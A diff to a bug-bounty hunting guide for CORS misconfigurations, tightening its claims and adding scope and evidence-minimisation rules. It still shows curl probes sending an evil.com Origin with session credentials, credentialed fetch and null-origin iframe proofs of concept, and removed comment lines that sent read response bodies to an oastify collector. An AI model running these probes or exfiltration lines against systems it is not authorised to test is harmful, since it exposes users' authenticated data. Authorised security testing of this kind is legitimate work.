@@ -33,15 +33,15 @@ sources: hackerone_public
 
 ## What actually pays (and what does not)
 
-CORS pays High **only** when an attacker-controlled origin can perform a
+Credentialed cross-origin data disclosure is established **only** when an attacker-controlled origin can perform a
 **credentialed** cross-origin read of sensitive authenticated data, and you
 have a browser PoC proving the response body is readable from `evil.com`.
 
 Two hard browser rules that kill most "findings" — check these FIRST:
 
 - **`Access-Control-Allow-Origin: *` CANNOT be combined with credentials.**
-  If the server returns `ACAO: *`, the browser refuses to send/expose the
-  response for a `credentials: include` request. A wildcard-only endpoint is
+  If the server returns `ACAO: *`, the browser refuses to expose the
+  response for a `credentials: include` request; a simple request may still have been sent, so this is not CSRF protection. A wildcard-only endpoint is
   **not** credential-exploitable. It is only interesting if the data it serves
   is sensitive *without* a session (rare) — usually this is Informational/Low.
 - **`Access-Control-Allow-Credentials: true` is meaningless on its own.** It
@@ -49,8 +49,7 @@ Two hard browser rules that kill most "findings" — check these FIRST:
   cross-origin credentialed `fetch` actually returns a readable body. ACAC on a
   response that does not reflect your origin proves nothing.
 
-If you cannot demonstrate a readable cross-origin authed body in a real
-browser, you do not have a High. Do not submit header-diffing alone.
+For a credentialed-read claim, prove browser-readable protected data under the actual cookie/browser conditions. Header differences alone do not establish impact; severity follows the application and program, not this guide.
 
 ---
 
@@ -59,7 +58,7 @@ browser, you do not have a High. Do not submit header-diffing alone.
 - **Reflect-any-origin + credentials** — server echoes the `Origin` header AND
   sets `ACAC: true` → any site reads authed API responses. The classic High.
 - **Null-origin trust** — `ACAO: null` + `ACAC: true`. A `sandbox` iframe (or a
-  `data:`/redirect chain) emits `Origin: null`, so any page can read authed data.
+  `data:`/redirect chain) emits `Origin: null`, so a controlled opaque-origin document may read data if cookies and all browser checks permit it.
 - **Subdomain-regex bypass** — trusted-origin regex with a parsing flaw. The
   correct payload depends on *which* flaw (see Phase 3 — this is where most
   skills get it wrong).
@@ -88,16 +87,18 @@ tokens, CSRF tokens, or other secrets in the body.
 
 ## Step-by-Step Hunting Methodology
 
+After the exact-command gate, use only owner-approved URLs/accounts and origins you control. Validate bulk input against the scope allowlist before adding any credential. CURL_AUTH_CONFIG is an existing private untracked curl config containing only the test account’s cookie; do not put it in argv, logs or reports. Do not follow redirects with account cookies across an unreviewed destination. Header probes are hypotheses, not browser evidence.
+
 ### Phase 1 — Discover CORS endpoints
 ```bash
 # Probe API endpoints. Use GET (not -I): some servers only emit CORS on GET,
 # and -I sends HEAD which may be handled differently.
-while read url; do
+while IFS= read -r url; do
   result=$(curl -s -D - -o /dev/null "$url" \
     -H "Origin: https://evil.com" \
-    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
+    --config "$CURL_AUTH_CONFIG" | grep -i "access-control")
   [ -n "$result" ] && echo "=== $url ===" && echo "$result"
-done < recon/$TARGET/api-endpoints.txt
+done < "recon/$TARGET/api-endpoints.txt"
 
 # httpx bulk check
 cat recon/$TARGET/live-hosts.txt | awk '{print $1}' | \
@@ -109,7 +110,7 @@ cat recon/$TARGET/live-hosts.txt | awk '{print $1}' | \
 # Does the server reflect an arbitrary Origin back?
 curl -s -D - -o /dev/null https://$TARGET/api/me \
   -H "Origin: https://evil.com" \
-  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"
+  --config "$CURL_AUTH_CONFIG" | grep -i "access-control"
 
 # Vulnerable (the High case):
 #   Access-Control-Allow-Origin: https://evil.com   <- reflects attacker origin
@@ -122,7 +123,7 @@ curl -s -D - -o /dev/null https://$TARGET/api/me \
 # Null-origin trust
 curl -s -D - -o /dev/null https://$TARGET/api/me \
   -H "Origin: null" \
-  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"
+  --config "$CURL_AUTH_CONFIG" | grep -i "access-control"
 # Looking for:  Access-Control-Allow-Origin: null  +  ACAC: true
 ```
 
@@ -151,7 +152,7 @@ for ORIGIN in \
   "http://target.com"; do
   RESULT=$(curl -s -D - -o /dev/null "https://$TARGET/api/me" \
     -H "Origin: $ORIGIN" \
-    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
+    --config "$CURL_AUTH_CONFIG" | grep -i "access-control")
   echo "[$ORIGIN] -> ${RESULT:-no CORS}"
 done
 ```
@@ -162,7 +163,7 @@ you can actually control a `*.target.com` host (then see Phase 6 / hunt-subdomai
 ### Phase 3b — Trusted insecure (HTTP) origin
 If ACAO reflects/allows any `http://` origin (even a correctly-anchored in-scope one) with ACAC:true, a network attacker on that cleartext host injects a page that reads the authed cross-origin body — no regex flaw needed, the plaintext scheme IS the flaw.
 ```bash
-curl -s -D- -o/dev/null "https://$TARGET/api/me" -H "Origin: http://sub.$TARGET" -H "Cookie: $SESSION" | grep -i access-control
+curl -s -D- -o/dev/null "https://$TARGET/api/me" -H "Origin: http://sub.$TARGET" --config "$CURL_AUTH_CONFIG" | grep -i access-control
 ```
 Real only if a MITM can occupy that http origin (no HSTS-preload). Pair with `hunt-tls-network`. (PortSwigger: CORS with trusted insecure protocols.)
 
@@ -174,8 +175,8 @@ things to test:
 
 1. **Does the pre-flight authorize arbitrary methods/headers for your origin?**
    If `Access-Control-Allow-Methods` / `Access-Control-Allow-Headers` reflect
-   whatever you ask for, a malicious origin can drive state-changing requests
-   (chain to CSRF-style writes that JSON/SameSite would otherwise block).
+   whatever you ask for, a malicious origin may be permitted to send state-changing requests
+   (provided the actual cookie policy and server authorization permit it; CORS does not override SameSite or reveal a secret custom-auth header).
 
 ```bash
 curl -s -D - -o /dev/null -X OPTIONS "https://$TARGET/api/account/email" \
@@ -185,7 +186,7 @@ curl -s -D - -o /dev/null -X OPTIONS "https://$TARGET/api/account/email" \
   | grep -i "access-control"
 # Vulnerable: ACAO reflects evil.com + ACAC:true +
 #   Access-Control-Allow-Methods: PUT  +  Access-Control-Allow-Headers: x-custom-auth
-# => attacker origin can issue authed PUT/DELETE with custom headers.
+# => possible request permission only; demonstrate actual browser credential delivery and server authorization in a synthetic fixture.
 ```
 
 2. **Is the pre-flight even enforced server-side?** Some servers reflect the
@@ -206,7 +207,7 @@ fetch("https://TARGET/api/me", {credentials: "include"})
   .then(r => r.text())
   .then(d => {
     document.getElementById("out").innerText = d;        // prove readable body
-    // OOB proof: fetch("https://OOB-ID.oastify.com/?d="+encodeURIComponent(d));
+    // Keep only a synthetic canary proof; do not forward account data to an external collector.
   })
   .catch(e => document.getElementById("out").innerText = "BLOCKED: " + e);
 </script></body>
@@ -228,13 +229,13 @@ document must lack `allow-same-origin` so its origin is opaque (`null`):
 <script>
 window.addEventListener("message", e => {
   // d is the authed body, read cross-origin via a null Origin
-  // fetch("https://OOB-ID.oastify.com/?d="+encodeURIComponent(e.data));
-  console.log("NULL-ORIGIN READ:", e.data);
+  // Display only the synthetic fixture; no external data collection.
+  if (e.source !== document.querySelector("iframe").contentWindow) return;
+  console.log("NULL-ORIGIN CANARY:", e.data);
 });
 </script></body>
 ```
-(Alternative null-origin emitters: a `data:` / `blob:` document, or bouncing the
-request through a 302 redirect chain whose final hop is cross-scheme.)
+(Alternative null-origin emitters: a sandboxed or data document with a verified opaque origin. A blob URL usually inherits its creator origin; redirect behavior is not a universal null-origin emitter.)
 
 **5c. Trusted-subdomain read** — once you control a host that the regex trusts
 (real subdomain via takeover, or a registerable origin that matches a buggy
@@ -260,9 +261,9 @@ client-side auth bypass). See hunt-dom for exploitation depth.
 
 ## Automation (triage only — never the proof)
 ```bash
-# corsy — fast reflection/null/pre-domain checks
-pip3 install corsy
-corsy -u https://$TARGET -t 10 --headers "Cookie: $SESSION_COOKIE"
+# Optional third-party scanner: resolve its real upstream, reviewed version,
+# interface and isolated environment first. No corsy command is bundled here;
+# do not assume a pip package with that name is the intended project.
 
 # nuclei CORS templates
 nuclei -u https://$TARGET -t http/misconfiguration/cors/
@@ -272,6 +273,8 @@ nuclei -u https://$TARGET -t http/misconfiguration/cors/
 Every automated hit is a lead, not a finding. Reproduce 5a/5b in a browser.
 
 ---
+
+A browser TypeError has multiple causes (network, TLS, preflight, cookie policy or CORS). Inspect DevTools before declaring the server secure or the hypothesis false. Match actual serialized origin, scheme and port; prefer a parsed explicit allowlist over a hostname regex in defensive fixes. A regex accepting intended subdomains is not automatically safe if those subdomains host untrusted users.
 
 ## Chain Table
 
@@ -291,7 +294,7 @@ Every automated hit is a lead, not a finding. Reproduce 5a/5b in a browser.
 - **Browser proof mandatory.** curl reflecting a header is NOT exploitation.
   Show a screenshot/console log of the authed body read from `evil.com`. If the
   fetch throws / logs `BLOCKED`, you have nothing.
-- **`ACAO: *` + credentials = not a finding.** Browsers block it. Only pursue
+- **`ACAO: *` blocks credentialed response exposure.** It does not prove the server rejected the request. Only pursue
   wildcard if the data is sensitive unauthenticated (then it is usually Low).
 - **`ACAC: true` alone proves nothing** — it must pair with your reflected
   origin AND a successful readable cross-origin body.
@@ -300,13 +303,11 @@ Every automated hit is a lead, not a finding. Reproduce 5a/5b in a browser.
   match and is not a bug.
 - **`evil.target.com` reflecting is not automatically a bug** — it is an
   in-scope subdomain by design unless you can actually control it.
-- **OOB confirmation** for blind/headless contexts: exfil the read body to a
-  Burp Collaborator / oastify host and show the interaction. Use a unique
-  per-test marker so the hit is unambiguously yours.
+- **Evidence minimization:** use a synthetic protected canary in an owner-provided test account. Keep proof local; any approved OOB service should receive only a unique non-sensitive marker, never the full response, session token or PII.
 - **Sensitive data requirement.** A readable `/api/health` is not High. Tie the
   read to PII, tokens, secrets, or financial data to justify severity.
 
-**Severity:**
+**Illustrative impact triage, not automatic severity or bounty authority:**
 - Reflects attacker origin + creds + sensitive body, browser-proven: High
 - Pre-flight authorizes attacker-origin state change on sensitive action: High
 - Null-origin + sensitive authed body, browser-proven: Medium–High
@@ -322,7 +323,7 @@ Every automated hit is a lead, not a finding. Reproduce 5a/5b in a browser.
 ## Limitations
 
 - Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
-- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
+- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; resolve and review any separately supplied tool before installation; this package provides no executable helper.
 - Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.
 
 ### Example
